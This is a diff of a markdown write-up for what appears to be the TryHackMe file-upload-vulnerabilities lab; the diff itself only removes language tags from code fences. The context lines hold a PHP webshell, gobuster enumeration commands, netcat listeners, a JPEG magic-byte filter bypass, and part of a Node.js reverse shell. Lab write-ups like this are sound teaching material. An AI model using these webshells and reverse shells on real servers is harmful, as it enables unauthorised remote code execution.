@@ -74,13 +74,13 @@ There are two primary methods for achieving Remote Code Execution (RCE)
 #### Webshells
 For a given webpage with upload form, run something like a [GoBuster]() scan on `dir` mode, using a relevant wordlist with `-w`.
 
-```shell
+```
 gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
 ```
 
 If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:
 
-```php
+```
 <?php 
 	echo system($_GET["cmd"]);
 ?>
@@ -91,7 +91,7 @@ From this point, system files can be read and/or attempts to upgrade the webshel
 #### Remote Shell
 After editing and uploading the necessary reverse shell script, such as [Pentest Monkey's 2007 PHP tool](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), the attacking machine can invoke a `netcat` listener via the venerable
 
-```shell
+```
 nc -lvnp 4444
 ```
 
@@ -102,7 +102,7 @@ The shell script will be activated by navigating to the uploaded shell's locatio
 
 Running:
 
-```shell
+```
 gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 ```
 
@@ -354,7 +354,7 @@ We begin by verifying that a standard `.jpeg` file can be uploaded; and that a `
 
 We then remember that the filtering mechanism in the previous example used `pathinfo()` to get the file's extension by parsing the characters after the final `.` in the filename. 
 
-```php
+```
 $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
 ```
 
@@ -376,13 +376,13 @@ First, we will upload a standard file to the server. Successsfully doing so will
 
 We then begin our investigation by running a `gobuster` scan of `annex.uploadvulns.thm`:
 
-```shell
+```
 gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
 ```
 
 The scan enumerates the following directories:
 
-```shell
+```
 1. /privacy (Status: 301) [Size: 332] [--> http://annex.uploadvulns.thm/privacy/]
 2. /assets (Status: 301) [Size: 331] [--> http://annex.uploadvulns.thm/assets/]
 ```
@@ -405,7 +405,7 @@ While we receive `File type is invalid` responses for 8 of the 9 files listed ab
 
 From here we simply invoke our `netcat` listener on our attack machine with:
 
-```shell
+```
 nc -lvnp 4444
 ```
 
@@ -424,7 +424,7 @@ As we know that `.jpeg` files are permitted by the filter, we should be able to 
 
 Next, we open the file in `hexeditor` (or an equivalent application) and change the conventional characters to `FF D8 FF DB` - the magic numbers for `.jpeg` format files. To check that this has been done properly, run:
 
-```shell
+```
 file ptm-shell.php
 ```
 
@@ -503,7 +503,7 @@ From this, we learn that this site is running [Express](https://expressjs.com/),
 
 Luckily for us, the PayloadsAllTheThings [Reverse Shell Cheat Sheet repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs) on GitHub includes a reverse shell script for use with `Node.js`. Here it is:
 
-```js
+```
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -528,7 +528,7 @@ For more information, we can inspect the source code of the page, which includes
 
 Also, note this line in the source code of the home page:
 
-```html
+```
 <input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">
 ```
 
@@ -595,7 +595,7 @@ In order to confirm our success, we can run another `gobuster` scan, which confi
 
 To activate our reverse shell and achieve RCE, we'll need to remember to enable our `netcat` listener with:
 
-```shell
+```
 nc -lvnp 4444
 ```
 
